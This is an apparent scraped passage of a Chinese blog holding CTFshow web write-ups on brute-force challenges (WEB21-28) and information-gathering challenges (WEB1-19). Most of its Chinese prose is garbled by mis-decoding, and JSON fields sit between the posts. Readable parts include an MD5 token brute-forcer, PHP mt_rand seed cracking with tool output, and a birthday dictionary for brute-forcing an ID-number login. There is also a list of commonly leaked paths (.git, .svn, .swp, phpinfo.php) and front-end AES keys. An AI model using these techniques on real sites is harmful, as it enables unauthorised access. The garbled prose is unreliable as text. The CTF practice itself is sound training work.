å“ˆå¸Œç»“æœæ»¡è¶³æ‰€æœ‰æ¡ä»¶ï¼š æ»¡è¶³å­—ç¬¦ç›¸ç­‰æ€§æ¡ä»¶ï¼š substr($token, 1,1), substr($token, 14,1), å’Œ substr($token, 17,1) çš„å­—ç¬¦å¿…é¡»ç›¸ç­‰ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥é€‰æ‹©ä¸€ä¸ªç®€å•çš„æ•´æ•°æˆ–å­—ç¬¦ï¼Œä½¿å¾— md5 çš„ç¬¬2ä½ã€ç¬¬15ä½å’Œç¬¬18ä½å­—ç¬¦ç›¸åŒã€‚ æ»¡è¶³æ•°å­¦æ¡ä»¶ï¼š ç¡®ä¿ (intval(substr($token, 1,1)) + intval(substr($token, 14,1)) + intval(substr($token, 17,1))) / substr($token, 1,1) === intval(substr($token, 31,1))ã€‚ è¿™æ„å‘³ç€æˆ‘ä»¬éœ€è¦è°ƒæ•´ token çš„å€¼ï¼Œä½¿å¾— md5 å“ˆå¸Œçš„ç¬¬2ä½å’Œç¬¬32ä½ç¬¦å·æ»¡è¶³è¯¥æ•°å­¦æ¡ä»¶ã€‚ å¯ä»¥ä½¿ç”¨ä»£ç æˆ–æ‰‹åŠ¨å°è¯•ç”Ÿæˆä¸€ä¸ªå€¼ï¼Œä½¿å…¶ md5 å“ˆå¸Œç¬¦åˆä¸Šè¿°è§„åˆ™ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import hashlib def find_token(): for i in range(100000): # å°è¯•0åˆ°99999çš„æ•´æ•°ä½œä¸ºå€™é€‰ token token = str(i) # å°†å€™é€‰å€¼è½¬æ¢ä¸ºå­—ç¬¦ä¸² md5_hash = hashlib.md5(token.encode()).hexdigest() # æ£€æŸ¥æ¡ä»¶ï¼šç¬¬2ä½ã€ç¬¬15ä½å’Œç¬¬18ä½å­—ç¬¦æ˜¯å¦ç›¸åŒ if md5_hash[1] == md5_hash[14] == md5_hash[17]: # ç¡®ä¿ç¬¬2ä½å’Œç¬¬32ä½å­—ç¬¦éƒ½æ˜¯æ•°å­— if md5_hash[1].isdigit() and md5_hash[31].isdigit(): # æ£€æŸ¥æ•°å­¦æ¡ä»¶ if (int(md5_hash[1]) + int(md5_hash[14]) + int(md5_hash[17])) / int(md5_hash[1]) == int(md5_hash[31]): print(f\u0026#34;Found token: {token}\u0026#34;) print(f\u0026#34;MD5 hash: {md5_hash}\u0026#34;) return token # è¿”å›ç¬¦åˆæ¡ä»¶çš„ token print(\u0026#34;No valid token found.\u0026#34;) return None # æ‰§è¡Œç¨‹åº find_token() è¿™ä¸ªä»£ç è™½ç„¶æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯å¯¹äºè¿™é“é¢˜ä»¥åŠå¤Ÿç”¨äº†ï¼Œè¿è¡Œç›´æ¥è¾“å‡º\n1 2 Found token: 422 MD5 hash: f85454e8279be180185cac7d243c5eb3 ç›´æ¥ä¼ å‚/?token=422è·å–flag\nWEB24 çˆ†ä¸ªğŸ”¨\nç›´æ¥çœ‹phpä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-03 13:26:39 # @Last Modified by: h1xa # @Last Modified time: 2020-09-03 13:53:31 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); include(\u0026#34;flag.php\u0026#34;); if(isset($_GET[\u0026#39;r\u0026#39;])){ $r = $_GET[\u0026#39;r\u0026#39;]; mt_srand(372619038); if(intval($r)===intval(mt_rand())){ echo $flag; } }else{ highlight_file(__FILE__); echo system(\u0026#39;cat /proc/version\u0026#39;); } ?\u0026gt; Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 è™½ç„¶æ˜¯éšæœºæ•°ï¼Œä½†æ˜¯ç§å­éƒ½ç»™æˆ‘ä»¬äº†è¿˜æœ‰å•¥å¥½è¯´çš„ï¼Œç›´æ¥å†™ä¸ªæ–‡ä»¶è§£å‡ºæ¥å’¯\n1 2 3 4 \u0026lt;?php mt_srand(372619038); echo mt_rand(); ?\u0026gt; è§£å‡º1155388967ï¼Œç›´æ¥ä¼ å‚?r=1155388967è·å–åˆ°flag\nWEB25 çˆ†ä¸ªğŸ”¨ï¼Œä¸çˆ†äº†\nè¿™é“é¢˜ä¸€çœ‹æ„Ÿè§‰éš¾äº†ä¸å°‘ï¼Œè™½ç„¶è¿˜æ˜¯ä¼ å‚ï¼Œä½†æ˜¯æ²¡æœ‰å‰ä¸¤é“å¯ä»¥ä¸€çœ¼ä¸çœŸäº†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-03 13:56:57 # @Last Modified by: h1xa # @Last Modified time: 2020-09-03 15:47:33 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); include(\u0026#34;flag.php\u0026#34;); if(isset($_GET[\u0026#39;r\u0026#39;])){ $r = $_GET[\u0026#39;r\u0026#39;]; mt_srand(hexdec(substr(md5($flag), 0,8))); $rand = intval($r)-intval(mt_rand()); if((!$rand)){ if($_COOKIE[\u0026#39;token\u0026#39;]==(mt_rand()+mt_rand())){ echo $flag; } }else{ echo $rand; } }else{ highlight_file(__FILE__); echo system(\u0026#39;cat /proc/version\u0026#39;); } Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 éšä¾¿ä¼ ä¿©å‚å‘ç°ä¼šè¿”å›ä¸€ä¸ªå€¼ï¼Œè¯¢é—®chatgptåˆ†æåå‘ç°è¿™ä¸ªè¯­å¥mt_srand(hexdec(substr(md5($flag), 0,8))); ç”¨ $flag çš„ MD5 æ•£åˆ—å€¼çš„å‰8ä½ä½œä¸ºç§å­ï¼Œè®¾ç½®äº†ä¸€ä¸ªç‰¹å®šçš„éšæœºæ•°ç§å­ï¼Œç„¶åæŠŠä¼ è¿›å»çš„å‚å’Œè¿™ä¸ªå€¼åšå·®ï¼Œç›´æ¥ä¼ ä¸ªr=0ç›´æ¥å°±å¾—å‡ºäº†å‚æ•°?r=1570172612\nç„¶åæ€è·¯å°±å¡æ­»äº†\u0026hellip;\u0026hellip;å› ä¸ºå¹¶ä¸çŸ¥é“å¼€å§‹çš„ç§å­ï¼Œçˆ†ç ´ä¸çŸ¥é“è¦çˆ†åˆ°ä»€ä¹ˆæ—¶å€™\u0026hellip;..çœ‹äº†å‡ ä¸ªwpå’Œæç¤ºï¼Œé€šè¿‡è¿™é‡Œä¸‹è½½äº†ä¸€ä¸ªçˆ†ç ´ç§å­çš„è½¯ä»¶ï¼Œæˆ‘æ˜¯åœ¨Linuxä¸‹ç¼–è¯‘è¿è¡Œçš„ï¼Œè¾“å…¥ç¬¬ä¸€ä¸ªç§å­ï¼Œ\n1 2 3 4 \u0026lt;?php mt_srand(202568455); //çˆ†ç ´å‡ºçš„ç§å­ echo mt_rand()+mt_rand()+mt_rand()-ç¬¬ä¸€ä¸ªmt_randçš„å€¼; // ç”±äºæ‰§è¡Œäº†3æ¬¡ï¼Œè€ŒæœŸæœ›çš„å€¼ï¼ˆcookieï¼‰åªéœ€è¦ç¬¬äºŒä¸‰ä¸ªï¼Œè¿™é‡Œå‡å»ç¬¬ä¸€ä¸ªå€¼ ?\u0026gt; è¿™é‡Œè¯•äº†éå¸¸ï¼éå¸¸ï¼ä¹…ï¼å¤ç°åˆ«äººçš„éƒ½æˆåŠŸäº†ï¼ˆæ¯”å¦‚æç¤ºé‡Œé‚£ä¸ªï¼‰ï¼Œä½†æ˜¯æˆ‘è¿™ä¸ªæ¯ä¸ªéƒ½è¯•äº†å°±æ˜¯ä¸è¡Œï¼Œæˆ‘çŒœæµ‹æ˜¯è¿™ä¸ªç§å­æ— è§£å¯¼è‡´çš„ï¼Œè¿™é‡Œè´´ä¸Šè§£å‡ºæ¥çš„å†…å®¹å’Œç§å­ï¼Œå¸Œæœ›æœ‰å¤§ä½¬å¯ä»¥è§£ç­”ä¸€ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/æ¡Œé¢/233/php_mt_seed-4.0] â””â”€# \u0026#39;/home/kali/æ¡Œé¢/233/php_mt_seed-4.0/php_mt_seed\u0026#39; 1570172612 Pattern: EXACT Version: 3.0.7 to 5.2.0 Found 0, trying 0xc8000000 - 0xcbffffff, speed 16777.2 Mseeds/s seed = 0xcbd7561a = 3419887130 (PHP 3.0.7 to 5.2.0) seed = 0xcbd7561b = 3419887131 (PHP 3.0.7 to 5.2.0) Found 2, trying 0xfc000000 - 0xffffffff, speed 16911.4 Mseeds/s Version: 5.2.1+ Found 2, trying 0xb2000000 - 0xb3ffffff, speed 167.2 Mseeds/s seed = 0xb38818b6 = 3012040886 (PHP 5.2.1 to 7.0.x; HHVM) Found 3, trying 0xbc000000 - 0xbdffffff, speed 166.4 Mseeds/s seed = 0xbd0e7df0 = 3171843568 (PHP 5.2.1 to 7.0.x; HHVM) Found 4, trying 0xc6000000 - 0xc7ffffff, speed 166.1 Mseeds/s seed = 0xc7d72544 = 3352765764 (PHP 5.2.1 to 7.0.x; HHVM) seed = 0xc7d72544 = 3352765764 (PHP 7.1.0+) Found 6, trying 0xd2000000 - 0xd3ffffff, speed 165.9 Mseeds/s seed = 0xd2005b5c = 3523238748 (PHP 5.2.1 to 7.0.x; HHVM) seed = 0xd2005b5c = 3523238748 (PHP 7.1.0+) Found 8, trying 0xfe000000 - 0xffffffff, speed 165.2 Mseeds/s Found 8 é‡å¼€ç¯å¢ƒå†æ¬¡è¿›è¡Œæµ‹è¯•\nè¿™æ¬¡è¾“å‡º\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/æ¡Œé¢/233/php_mt_seed-4.0] â””â”€# \u0026#39;/home/kali/æ¡Œé¢/233/php_mt_seed-4.0/php_mt_seed\u0026#39; 1164719300 Pattern: EXACT Version: 3.0.7 to 5.2.0 Found 0, trying 0x88000000 - 0x8bffffff, speed 17551.5 Mseeds/s seed = 0x8bf3d33e = 2348012350 (PHP 3.0.7 to 5.2.0) seed = 0x8bf3d33f = 2348012351 (PHP 3.0.7 to 5.2.0) Found 2, trying 0xfc000000 - 0xffffffff, speed 17616.1 Mseeds/s Version: 5.2.1+ Found 2, trying 0x32000000 - 0x33ffffff, speed 161.9 Mseeds/s seed = 0x334a2baf = 860498863 (PHP 7.1.0+) Found 3, trying 0x84000000 - 0x85ffffff, speed 163.8 Mseeds/s seed = 0x8540cacf = 2235615951 (PHP 5.2.1 to 7.0.x; HHVM) Found 4, trying 0xa4000000 - 0xa5ffffff, speed 164.3 Mseeds/s seed = 0xa490bd69 = 2760949097 (PHP 7.1.0+) Found 5, trying 0xfe000000 - 0xffffffff, speed 165.2 Mseeds/s Found 5 ä½¿ç”¨ä»¥ä¸‹ä»£ç å‡ºè§£\n1 2 3 4 \u0026lt;?php mt_srand(2760949097); //çˆ†ç ´å‡ºçš„ç§å­ echo mt_rand()+mt_rand()+mt_rand()-1164719300; // ç”±äºæ‰§è¡Œäº†3æ¬¡ï¼Œè€ŒæœŸæœ›çš„å€¼ï¼ˆcookieï¼‰åªéœ€è¦ç¬¬äºŒä¸‰ä¸ªï¼Œè¿™é‡Œå‡å»ç¬¬ä¸€ä¸ªå€¼ ?\u0026gt; æœ€ågetä¼ å‚?r=1164719300ï¼Œcookieä½¿ç”¨Hackbartoken=1458369882ç›´æ¥executeæ‹¿åˆ°flagctfshow{87e05252-fe88-4767-85e1-c75fd6eb124b}\nç„¶åä¸å°å¿ƒæŠŠå®¹å™¨é”€æ¯äº†ï¼Œåˆè¦é‡åšäº†å‘œå‘œå‘œ\nä¸è¿‡è¿™é“é¢˜å€’æ˜¯åšå‡ºæ¥äº†\nWEB26 è¿™ä¸ªå¯ä»¥çˆ†\nè¿™é“é¢˜å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯çˆ†ç ´ï¼Œç»“æœç ”ç©¶äº†åŠå¤©å‘ç°è¦å¡«å…¥çš„é¡¹å¤ªå¤šäº†ä¸çŸ¥é“æ€ä¹ˆåšï¼Œåæ¥ç›´æ¥å¡«çš„ç©ºå‚æ•°ç›´æ¥è¿æ¥æˆåŠŸäº†ï¼Œä¹Ÿæ˜¯éå¸¸å¼‚æˆ–å•Šï¼Œç›´æ¥ç”¨burpé‡æ”¾å™¨å‘é€è¯·æ±‚å³å¯çœ‹åˆ°flag\nWEB27 CTFshowèœé¸¡å­¦é™¢æ‹›ç”Ÿå•¦ï¼\nçœ‹åˆ°æœ‰å½•å–åå•åˆ—è¡¨ï¼Œæ‰“å¼€å‘ç°èº«ä»½è¯è¢«å»æ‰äº†å‡ºç”Ÿæ—¥æœŸè¿™ä¸€éƒ¨åˆ†ï¼Œä½¿ç”¨ä¸‹é¢çš„è„šæœ¬ä¾¿æ·åœ°ç”Ÿæˆç”Ÿæ—¥å­—å…¸\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 from datetime import datetime, timedelta def generate_birthday_dict(start_date, end_date): \u0026#34;\u0026#34;\u0026#34; ç”ŸæˆæŒ‡å®šæ—¥æœŸèŒƒå›´å†…çš„ç”Ÿæ—¥å­—å…¸ã€‚ Args: start_date (str): å¼€å§‹æ—¥æœŸï¼Œæ ¼å¼ä¸º \u0026#34;YYYY-MM-DD\u0026#34; end_date (str): ç»“æŸæ—¥æœŸï¼Œæ ¼å¼ä¸º \u0026#34;YYYY-MM-DD\u0026#34; Returns: dict: ç”Ÿæ—¥å­—å…¸ï¼Œé”®ä¸ºæ—¥æœŸï¼Œå€¼ä¸ºç©ºå­—ç¬¦ä¸²ï¼ˆç”¨äºå¡«å†™åå­—ï¼‰ \u0026#34;\u0026#34;\u0026#34; date_format = \u0026#34;%Y%m%d\u0026#34; start = datetime.strptime(start_date, date_format) end = datetime.strptime(end_date, date_format) current = start birthday_dict = {} while current \u0026lt;= end: birthday_dict[current.strftime(date_format)] = \u0026#34;\u0026#34; current += timedelta(days=1) return birthday_dict def save_birthday_dict_to_txt(birthday_dict, filename=\u0026#34;birthdays.txt\u0026#34;): \u0026#34;\u0026#34;\u0026#34; å°†ç”Ÿæ—¥å­—å…¸ä¿å­˜åˆ° txt æ–‡ä»¶ä¸­ã€‚ Args: birthday_dict (dict): ç”Ÿæ—¥å­—å…¸ï¼Œé”®ä¸ºæ—¥æœŸï¼Œå€¼ä¸ºç©ºå­—ç¬¦ä¸² filename (str): è¾“å‡ºæ–‡ä»¶å \u0026#34;\u0026#34;\u0026#34; with open(filename, \u0026#34;w\u0026#34;) as file: for date, name in birthday_dict.items(): file.write(f\u0026#34;{date}\\n\u0026#34;) print(f\u0026#34;ç”Ÿæ—¥å­—å…¸å·²ä¿å­˜åˆ° {filename}\u0026#34;) # ç”¨æˆ·è¾“å…¥æ—¥æœŸèŒƒå›´ start_date = input(\u0026#34;è¯·è¾“å…¥å¼€å§‹æ—¥æœŸ (YYYYMMDD): \u0026#34;) end_date = input(\u0026#34;è¯·è¾“å…¥ç»“æŸæ—¥æœŸ (YYYYMMDD): \u0026#34;) # ç”Ÿæˆç”Ÿæ—¥å­—å…¸å¹¶ä¿å­˜ birthday_dict = generate_birthday_dict(start_date, end_date) save_birthday_dict_to_txt(birthday_dict) ç”Ÿæˆä¸€ä¸ª1990-2010ç”Ÿæ—¥çš„å­—å…¸ï¼Œç„¶åæ”¾åˆ°burpçš„é‡æ”¾å™¨é‡Œè·‘ä¸€éï¼Œå‘ç°\na=%E5%B5%87%E5%BC%80%E6%A2%A6\u0026amp;p=360730199110167653\næˆåŠŸå¾—å‡ºç»“æœï¼Œä¸è¿‡æ˜¯\\uçš„å­—ç¬¦ï¼Œæ‰¾ä¸ªåœ¨çº¿ç½‘ç«™è§£ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚è§£å‡ºè´¦å·å’Œå¯†ç ç›´æ¥é€‰æ‹©å­¦ç”Ÿç™»å½•å³å¯æˆåŠŸã€‚\nWEB28 å¤§æµ·æé’ˆ\nè¿™é“é¢˜æ‰“å¼€ç¯å¢ƒå‘ç°/0/1/2.txtï¼ŒçŒœæµ‹æ˜¯ç›®å½•çˆ†ç ´ï¼Œä½¿ç”¨Burpçš„IntruderåŠŸèƒ½çˆ†ç ´ï¼Œçœ‹æç¤ºåç›´æ¥ç”¨/1-100/1-100æ‰«æå°±å¯ä»¥äº†ï¼Œä¸éœ€è¦ç”¨åˆ«çš„å¤æ‚æ–¹æ³•ã€‚\n","date":"2024-11-07T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_explosion_write_up/","title":"CTF_show Web çˆ†ç ´writeup WEB21-WEB28"},{"content":"CTFSHOW webå…¥é—¨ ä¿¡æ¯æ”¶é›†WriteUP 2 3 3 C T F S H O W\nå› ä¸ºæ”¾å›¾åå›½å†…ç½‘ç»œé—®é¢˜å¯¼è‡´åŠ è½½é€Ÿåº¦å¾ˆæ…¢æ•ˆæœä¸ä½³æ‰€ä»¥ä»è¿™ä¸ªå¼€å§‹å°±å°½é‡ä¸æ”¾å›¾ç‰‡äº†\nWEB1 å¼€å‘æ³¨é‡ŠæœªåŠæ—¶åˆ é™¤\nè¿›å…¥ç¯å¢ƒç›´æ¥ä½¿ç”¨F12æ‰“å¼€æ§åˆ¶å°å³å¯æ‰¾å‡ºflag\n\u0026lt;!-- ctfshow{4fd63d59-4831-49ff-9bd6-4ee34b8e70c4} --\u0026gt;\nWEB2 jså‰å°æ‹¦æˆª === æ— æ•ˆæ“ä½œ\nè¿™é“é¢˜è¿›å»ä»¥åå‘ç°F12æŒ‰äº†æ²¡ååº”ï¼Œå³é”®ä¹Ÿä¸è¡Œï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥é€šè¿‡æµè§ˆå™¨ç•Œé¢æ‰“å¼€å¼€å‘è€…æ¨¡å¼æˆ–è€…é€šè¿‡æŸ¥çœ‹æºä»£ç ç»•è¿‡ï¼Œflagå°±åœ¨æ³¨é‡Šé‡Œ\n\u0026lt;!-- ctfshow{5f025258-4778-4833-95ff-1941f3ae0f6e} --\u0026gt;\nWEB3 æ²¡æ€è·¯çš„æ—¶å€™æŠ“ä¸ªåŒ…çœ‹çœ‹ï¼Œå¯èƒ½ä¼šæœ‰æ„å¤–æ”¶è·\næ ¹æ®æç¤ºä»è¯·æ±‚å¤´ç›´æ¥æŠ“å–åˆ°flag\nFlag: ctfshow{c9e9eea4-5293-47d2-8f13-219856f7d61e}\nWEB4 æ€»æœ‰äººæŠŠåå°åœ°å€å†™å…¥robotsï¼Œå¸®é»‘é˜”å¤§ä½¬ä»¬å¼•è·¯ã€‚\nè¿™é“é¢˜æ ¹æ®æç¤ºç›´æ¥è®¿é—®robots.txtï¼Œè·å–åˆ°flagæ–‡ä»¶åœ°å€ï¼Œè®¿é—®å³å¯å¾—åˆ°flag\nWEB5 phpsæºç æ³„éœ²æœ‰æ—¶å€™èƒ½å¸®ä¸Šå¿™\nè¿™é“é¢˜ä¸€å¼€å§‹æ²¡æœ‰æ€è·¯ï¼Œä½†æ˜¯çœ‹åˆ°phpsæ–‡ä»¶å°è¯•è®¿é—®index.phpsä¸‹è½½åˆ°ä¸»é¡µçš„æºç åç›´æ¥åœ¨æ³¨é‡Šé‡Œå¾—åˆ°flag\n//ctfshow{2b127e88-8378-410e-abe0-1f215357d8ac}\nWEB6 è§£å‹æºç åˆ°å½“å‰ç›®å½•ï¼Œæµ‹è¯•æ­£å¸¸ï¼Œæ”¶å·¥\nè¿™é“é¢˜æ˜¯ç«™é•¿å¤ªç²—å¿ƒç›´æ¥æŠŠç½‘ç«™æºç é—ç•™åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæ‰«æç›®å½•å‘ç°www.zipï¼Œä¸‹è½½å³å¯ç›´æ¥è·å¾—flag\nWEB7 ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚\nè¿™é“é¢˜æ ¹æ®æç¤ºå¯ä»¥çŒœåˆ°æ˜¯ç‰ˆæœ¬æ–‡ä»¶æ³„éœ²ï¼Œå°è¯•è®¿é—®/.gitç›´æ¥è·å–flag\nWEB8 ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚\nå—¯ï¼Ÿéš¾é“æˆ‘çœ‹é”™é¢˜äº†ï¼Ÿä¸è¿‡æµ‹è¯•å‘ç°.gitè¿™æ¬¡ä¸è¡Œäº†ï¼Œç»è¿‡æœç´¢å‘ç°.svnä¹Ÿæ˜¯å¸¸ç”¨çš„å¼€å‘ç‰ˆæœ¬æ–‡ä»¶ï¼Œå°è¯•è®¿é—®å‘ç°ç›´æ¥è·å–flag\n1 2 3 NOTE å¸¸è§æ–‡ä»¶æ³„éœ²ç›®å½•æ ¼å¼ .git .svn .DS_store .hg /CVS/* .bzr .filename.swp phpinfo.php WEB9 å‘ç°ç½‘é¡µæœ‰ä¸ªé”™åˆ«å­—ï¼Ÿèµ¶ç´§åœ¨ç”Ÿäº§ç¯å¢ƒvimæ”¹ä¸‹ï¼Œä¸å¥½ï¼Œæ­»æœºäº†\nè¿™é¢˜ä¼¼ä¹ä¹Ÿæ²¡å•¥æ€è·¯ï¼Œä¸è¿‡ä¸Šä¸€é¢˜æŸ¥è¿‡vimçš„ç¼“å­˜æ–‡ä»¶ .filename.swp å°è¯•è®¿é—®index.php.swpç›´æ¥è·å–åˆ°äº†flag\nWEB10 cookie åªæ˜¯ä¸€å—é¥¼å¹²ï¼Œä¸èƒ½å­˜æ”¾ä»»ä½•éšç§æ•°æ®\næ ¹æ®æç¤ºç›´æ¥æŠ“åŒ…è·å–cookieå†…å­˜å‚¨çš„çš„flag\nWEB11 åŸŸåå…¶å®ä¹Ÿå¯ä»¥éšè—ä¿¡æ¯ï¼Œæ¯”å¦‚flag.ctfshow.com å°±éšè—äº†ä¸€æ¡ä¿¡æ¯\nç”¨å¥½å‡ ä¸ªç½‘ç«™æŸ¥è¯¢éƒ½ä¸è¡Œï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆé—®é¢˜ï¼Œå¯èƒ½åŸŸåæœ‰é—®é¢˜ï¼Œè®¿é—®ä¸äº†äº†ï¼Œä¸è¿‡å¤§æ¦‚æ˜¯è€ƒnslookupè¿™ç§åŸŸåè§£æçš„çŸ¥è¯†\nWEB12 æœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç \nç½‘ç«™åº•ä¸‹çš„å¸®åŠ©çƒ­çº¿å°±æ˜¯å¯†ç ï¼Œç›´æ¥ä½¿ç”¨adminè´¦å·å³å¯ç™»å½•\nWEB13 æŠ€æœ¯æ–‡æ¡£é‡Œé¢ä¸è¦å‡ºç°æ•æ„Ÿä¿¡æ¯ï¼Œéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒååŠæ—¶ä¿®æ”¹é»˜è®¤å¯†ç \nåœ¨ç½‘ç«™é¡¶éƒ¨çœ‹åˆ°documentï¼Œç‚¹è¿›å»åçœ‹åˆ°é»˜è®¤å¯†ç ï¼Œå°è¯•ç™»å½•ç›´æ¥æˆåŠŸ\nWEB14 æœ‰æ—¶å€™æºç é‡Œé¢å°±èƒ½ä¸ç»æ„é—´æ³„éœ²é‡è¦(editor)çš„ä¿¡æ¯,é»˜è®¤é…ç½®å®³æ­»äºº\nè¿™é“é¢˜ä¸€å¼€å§‹ä¹Ÿæ²¡æ€è·¯ï¼Œç‚¹æç¤ºåæ‰å‘ç°/editoræ˜¯ä¸ªèƒ½è®¿é—®çš„æ’å…¥ç¼–è¾‘å™¨ï¼Œé€‰æ‹©ä¸Šä¼ æ–‡ä»¶å‘ç°æœ‰ä¸ªæ–‡ä»¶æµè§ˆï¼Œä¸€çœ‹ç›´æ¥è¿ä¼ é©¬éƒ½ä¸éœ€è¦äº†ï¼Œç›´æ¥æ‰¾åˆ°flagæ‰€åœ¨æ–‡ä»¶æ‰“å¼€å³å¯\nWEB15 å…¬å¼€çš„ä¿¡æ¯æ¯”å¦‚é‚®ç®±ï¼Œå¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ï¼Œäº§ç”Ÿä¸¥é‡åæœ\næ ¹æ®æç¤ºæ‰¾åˆ°ä¸€ä¸ªQQé‚®ç®±ï¼Œå°è¯•/adminå‘ç°åå°ç®¡ç†ç•Œé¢ï¼Œå°è¯•é‚®ç®±å¤±è´¥ï¼Œä¸è¿‡å‘ç°æœ‰é‡ç½®å¯†ç ç•Œé¢ï¼Œç‚¹è¿›å»å‘ç°æ˜¯æˆ‘æ‰€åœ¨çš„åŸå¸‚ï¼Ÿæ ¹æ®QQé‚®ç®±çš„QQç›´æ¥æœåˆ°è¿™ä¸ªäººæ˜¯åœ¨è¥¿å®‰ï¼Œå°è¯•åç›´æ¥æ”¹æ‰äº†å¯†ç è¿›å…¥åå°\nWEB16 å¯¹äºæµ‹è¯•ç”¨çš„æ¢é’ˆï¼Œä½¿ç”¨å®Œæ¯•åè¦åŠæ—¶åˆ é™¤ï¼Œå¯èƒ½ä¼šé€ æˆä¿¡æ¯æ³„éœ²\nç›´æ¥è®¿é—®tz.phpæ‰¾phpinfoä¿¡æ¯ï¼Œç„¶åç›´æ¥æœç´¢åˆ°ä½œä¸ºflagçš„ç¯å¢ƒå˜é‡\nWEB17 å¤‡ä»½çš„sqlæ–‡ä»¶ä¼šæ³„éœ²æ•æ„Ÿä¿¡æ¯\nç›´æ¥ä¸‹è½½backup.sqlè·å¾—flag\nWEB18 ä¸è¦ç€æ€¥ï¼Œä¼‘æ¯ï¼Œä¼‘æ¯ä¸€ä¼šå„¿ï¼Œç©101åˆ†ç»™ä½ flag\nè¿™é“é¢˜æ˜¯ä¸ªå¾ˆéš¾çš„Flappy birdï¼Œç©äº†ä¸€ä¼šå‘ç°æ ¹æœ¬ä¸å¯èƒ½è¿‡ï¼Œæ‰€ä»¥F12æ‰¾åˆ°jsæ–‡ä»¶çš„é€šè¿‡æ¡ä»¶çš„js\n1 var result=window.confirm(\u0026#34;\\u4f60\\u8d62\\u4e86\\uff0c\\u53bb\\u5e7a\\u5e7a\\u96f6\\u70b9\\u76ae\\u7231\\u5403\\u76ae\\u770b\\u770b\u0026#34;); ç›´æ¥å¤åˆ¶åˆ°æ§åˆ¶å°ï¼Œå¼¹å‡ºæç¤ºï¼šä½ èµ¢äº†ï¼Œå»å¹ºå¹ºé›¶ç‚¹çš®çˆ±åƒçš®çœ‹çœ‹\næ ¹æ®è°éŸ³è®¿é—®110.phpç›´æ¥è·å–flag\nWEB19 å¯†é’¥ä»€ä¹ˆçš„ï¼Œå°±ä¸è¦æ”¾åœ¨å‰ç«¯äº†\nè¿™é“é¢˜å¯†é’¥å‰ç«¯éªŒè¯ï¼Œå¯ä»¥ç›´æ¥ä»å‰ç«¯æ‰¾åˆ°åˆ¤æ–­çš„jsä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function checkForm(){ var key = \u0026#34;0000000372619038\u0026#34;; var iv = \u0026#34;ilove36dverymuch\u0026#34;; var pazzword = $(\u0026#34;#pazzword\u0026#34;).val(); pazzword = encrypt(pazzword,key,iv); $(\u0026#34;#pazzword\u0026#34;).val(pazzword); $(\u0026#34;#loginForm\u0026#34;).submit(); } function encrypt(data,key,iv) { //key,ivï¼š16ä½çš„å­—ç¬¦ä¸² var key1 = CryptoJS.enc.Latin1.parse(key); var iv1 = CryptoJS.enc.Latin1.parse(iv); return CryptoJS.AES.encrypt(data, key1,{ iv : iv1, mode : CryptoJS.mode.CBC, padding : CryptoJS.pad.ZeroPadding }).toString(); } è¿˜ç»™äº†éªŒè¯çš„å¯†é’¥\n1 2 3 4 5 6 7 8 9 10 error_reporting(0); $flag=\u0026#34;fakeflag\u0026#34; $u = $_POST[\u0026#39;username\u0026#39;]; $p = $_POST[\u0026#39;pazzword\u0026#39;]; if(isset($u) \u0026amp;\u0026amp; isset($p)){ if($u===\u0026#39;admin\u0026#39; \u0026amp;\u0026amp; $p ===\u0026#39;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04\u0026#39;){ echo $flag; } } æ ¹æ®æ”¶é›†åˆ°çš„ä¿¡æ¯æœç´¢AESåŠ 